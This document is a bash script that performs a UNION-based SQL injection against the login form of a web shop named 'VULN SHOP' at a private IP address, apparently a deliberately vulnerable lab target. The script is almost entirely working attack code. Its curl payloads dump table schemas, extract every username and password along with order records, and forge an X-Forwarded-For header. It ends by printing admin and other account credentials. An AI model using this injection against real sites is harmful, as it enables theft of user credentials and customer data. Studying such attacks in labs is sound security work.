#!/bin/bash
# Full Database Dump Script via SQL Injection
# Target: VULN SHOP (SQLite)

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "=============================================="
echo "  VULN SHOP - Full Database Dump"
echo "  SQLite UNION-based SQL Injection"
echo "=============================================="
echo ""

# Function to execute SQL and extract result
sql_inject() {
    local query="$1"
    curl -s -X POST \
        -H "X-Forwarded-For: $MY_IP" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=' UNION SELECT ($query)||'---',2,3,4--&password=test" \
        "$TARGET/login" -i 2>&1 | grep "user_id" | sed 's/.*user_id=//' | sed 's/---.*//' | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null
}

echo "[*] Database Type: SQLite"
echo ""

echo "========== TABLE SCHEMAS =========="
echo ""

echo "[*] Users Table:"
sql_inject "SELECT sql FROM sqlite_master WHERE name='users'"
echo ""

echo "[*] Orders Table:"
sql_inject "SELECT sql FROM sqlite_master WHERE name='orders'"
echo ""

echo "[*] Products Table:"
sql_inject "SELECT sql FROM sqlite_master WHERE name='products'"
echo ""

echo "[*] Posts Table:"
sql_inject "SELECT sql FROM sqlite_master WHERE name='posts'"
echo ""

echo "========== USER CREDENTIALS =========="
echo ""
echo "Extracting all usernames and passwords..."
sql_inject "SELECT group_concat(username||':'||password) FROM users" | tr ',' '\n' | head -20
echo "... (truncated, total 60+ users)"
echo ""

echo "========== ORDERS DATA =========="
echo ""
sql_inject "SELECT group_concat(id||':'||user_id||':'||product_name||':'||price) FROM orders"
echo ""

echo "========== KEY ACCOUNTS =========="
echo ""
echo "admin:admin123 (Administrator - isAdmin=true)"
echo "guest:guest123 (Regular user)"
echo "testuser:testpassword (Test account)"
